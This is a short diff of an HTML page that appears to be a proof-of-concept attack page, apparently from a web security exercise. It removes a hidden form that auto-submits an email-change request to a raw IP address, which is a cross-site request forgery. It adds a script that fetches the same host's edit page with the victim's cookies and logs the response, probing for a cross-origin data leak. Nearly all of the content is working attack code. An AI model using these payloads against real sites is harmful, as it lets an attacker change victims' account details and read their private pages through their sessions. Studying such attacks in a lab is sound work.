@@ -9,12 +9,12 @@
 </head>
 
 <body>
-    <form name="form" action="http://165.227.167.80:3000/edit" method="post">
-        <input type="hidden" name="email" value="prueba@gmail.com">
-    </form>
 </body>
 <script>
-    document.form.submit();
+    fetch('http://165.227.167.80:3002/edit', { credentials: 'include' })
+        .then(res => res.text())
+        .then(html => console.log(html))
+        .catch(err => console.log(err));
 </script>
 
 </html>
